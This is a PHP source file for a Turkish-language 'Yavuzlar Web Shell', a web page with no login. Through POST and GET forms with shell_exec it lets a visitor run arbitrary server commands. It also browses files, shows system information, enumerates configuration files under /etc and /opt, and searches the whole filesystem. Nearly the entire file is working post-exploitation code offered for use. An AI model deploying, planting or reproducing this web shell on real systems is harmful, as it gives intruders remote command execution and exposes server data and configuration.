<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yavuzlar Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .header {
            background-color: #4CAF50;
            color: white;
            text-align: center;
            padding: 10px 0;
        }
        .container {
            display: flex;
            height: 100vh;
        }
        .sidebar {
            width: 250px;
            background-color: #f4f4f4;
            padding: 15px;
            box-shadow: 2px 0 5px rgba(0,0,0,0.1);
        }
        .sidebar button {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: none;
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
            text-align: left;
        }
        .sidebar button:hover {
            background-color: #45a049;
        }
        .content {
            flex-grow: 1;
            padding: 20px;
            overflow-y: auto;
        }
        .card {
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #4CAF50;
            color: white;
            padding: 10px;
            border: none;
            cursor: pointer;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="header">
    <h1>Yavuzlar Web Shell</h1>
</div>

<div class="container">
    <div class="sidebar">
        <button onclick="loadPage('home')">Ana Sayfa</button>
        <button onclick="loadPage('terminal')">Terminal (POST)</button>
        <button onclick="loadPage('terminalv2')">Terminal 2 (GET)</button>
        <button onclick="loadPage('filemanager')">Dosya Yöneticisi</button>
        <button onclick="loadPage('serverinfo')">Sunucu Bilgileri</button>
        <button onclick="loadPage('commands')">Komutlar</button>
        <button onclick="loadPage('help')">Yardım</button>
        <button onclick="loadPage('configdetect')">Konfig Dosyası Tespiti</button>
        <button onclick="loadPage('filesearch')">Dosya Araması</button>
        <button onclick="loadPage('filepermissions')">Dosya İzinleri</button>
    </div>
    <div class="content" id="content">
        <?php
        if (isset($_GET['page'])) {
            $page = $_GET['page'];
            if ($page == 'home') {
                homePage();
            } elseif ($page == 'terminal') {
                terminalPage();
            } elseif ($page == 'terminalv2') {
                terminalV2Page();
            } elseif ($page == 'filemanager') {
                filemanagerPage();
            } elseif ($page == 'serverinfo') {
                serverInfoPage();
            } elseif ($page == 'commands') {
                commandsPage();
            } elseif ($page == 'help') {
                helpPage();
            } elseif ($page == 'configdetect') {
                configFileDetectionPage();
            } elseif ($page == 'filesearch') {
                fileSearchPage();
            } elseif ($page == 'filepermissions') {
                filePermissionsPage();
            }
        } else {
            homePage();
        }

        function homePage() {
            echo '<div class="card"><h2>Ana Sayfa</h2><p>Web shell arayüzüne hoş geldiniz. Sol menüden işlevleri kullanabilirsiniz.</p></div>';
        }

        function terminalPage() {
            echo '<div class="card"><h2>Terminal (POST)</h2><form method="POST">';
            echo '<textarea name="command" placeholder="Komutu girin..." rows="4" cols="50"></textarea><br>';
            echo '<button type="submit" class="btn">Çalıştır</button></form>';
            if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['command'])) {
                $command = escapeshellcmd($_POST['command']);
                $output = shell_exec($command);
                echo '<pre>' . htmlspecialchars($output) . '</pre>';
            }
            echo '</div>';
        }

        function terminalV2Page() {
            echo '<div class="card"><h2>Terminal (GET)</h2><form method="GET">';
            echo '<input type="text" name="command" placeholder="Komutu girin..." required>';
            echo '<button type="submit" class="btn">Çalıştır</button></form>';
            if (isset($_GET['command'])) {
                $command = escapeshellcmd($_GET['command']);
                $output = shell_exec($command);
                echo '<pre>' . htmlspecialchars($output) . '</pre>';
            }
            echo '</div>';
        }

        function filemanagerPage() {
            echo '<div class="card"><h2>Dosya Yöneticisi</h2>';
            $output = shell_exec('ls -l');
            echo '<pre>' . htmlspecialchars($output) . '</pre>';
            echo '</div>';
        }

        function serverInfoPage() {
            echo '<div class="card"><h2>Sunucu Bilgileri</h2>';
            $output = shell_exec('uname -a');
            echo '<pre>' . htmlspecialchars($output) . '</pre>';
            echo '</div>';
        }

        function commandsPage() {
            echo '<div class="card"><h2>Kullanılabilir Komutlar</h2>';
            echo '<p>Örnek komutlar:</p>';
            echo '<ul><li>ls -l</li><li>uname -a</li><li>df -h</li></ul>';
            echo '</div>';
        }

        function helpPage() {
            echo '<div class="card"><h2>Yardım</h2>';
            echo '<p>Bu web shell, basit komut çalıştırma ve dosya yönetim işlemlerini sağlar.</p>';
            echo '</div>';
        }

        function configFileDetectionPage() {
            echo '<div class="card">';
            echo '<h2>Konfigürasyon Dosyası Tespiti</h2>';
            $output = shell_exec('find /etc /usr/local/etc /opt -type f \( -name "*.conf" -o -name "*.ini" \) 2>/dev/null');
            if (!empty($output)) {
                echo '<pre>' . htmlspecialchars($output) . '</pre>';
            } else {
                echo '<p>Herhangi bir konfigürasyon dosyası bulunamadı.</p>';
            }
            echo '</div>';
        }

        function fileSearchPage() {
            echo '<div class="card">';
            echo '<h2>Dosya Arama</h2>';
            if (isset($_POST['search_term'])) {
                $searchTerm = escapeshellarg($_POST['search_term']);
                $directory = isset($_POST['directory']) && !empty($_POST['directory']) ? escapeshellarg($_POST['directory']) : '/';
                $output = shell_exec('find ' . $directory . ' -type f -name ' . $searchTerm . ' 2>/dev/null');
                if (!empty($output)) {
                    echo '<pre>' . htmlspecialchars($output) . '</pre>';
                } else {
                    echo '<p>Aradığınız kriterlere uygun dosya bulunamadı.</p>';
                }
            }
            echo '<form method="POST">';
            echo '<input type="text" name="search_term" placeholder="Dosya adı..." required>';
            echo '<input type="text" name="directory" placeholder="Dizin (Varsayılan: /)">';
            echo '<button type="submit" class="btn">Ara</button>';
            echo '</form>';
            echo '</div>';
        }

        function filePermissionsPage() {
            echo '<div class="card">';
            echo '<h2>Dosya İzinleri Tespiti</h2>';
            if (isset($_POST['file_path'])) {
                $filePath = escapeshellarg($_POST['file_path']);
                $output = shell_exec('ls -l ' . $filePath . ' 2>/dev/null');
                if (!empty($output)) {
                    echo '<pre>' . htmlspecialchars($output) . '</pre>';
                } else {
                    echo '<p>Dosya bulunamadı veya izin bilgileri alınamadı.</p>';
                }
            }
            echo '<form method="POST">';
            echo '<input type="text" name="file_path" placeholder="Dosya yolu..." required>';
            echo '<button type="submit" class="btn">İzinleri Kontrol Et</button>';
            echo '</form>';
            echo '</div>';
        }
        ?>
    </div>
</div>

<script>
    function loadPage(page) {
        if (page) {
            window.history.pushState({}, '', '?page=' + page);
            fetch('?page=' + page)
                .then(response => response.text())
                .then(html => {
                    document.getElementById('content').innerHTML = html;
                })
                .catch(error => console.error('Error loading page:', error));
        }
    }

    window.onpopstate = function() {
        const params = new URLSearchParams(window.location.search);
        const page = params.get('page') || 'home';
        loadPage(page);
    };

    document.addEventListener('DOMContentLoaded', function() {
        const params = new URLSearchParams(window.location.search);
        const page = params.get('page') || 'home';
        loadPage(page);
    });
</script>

</body>
</html>
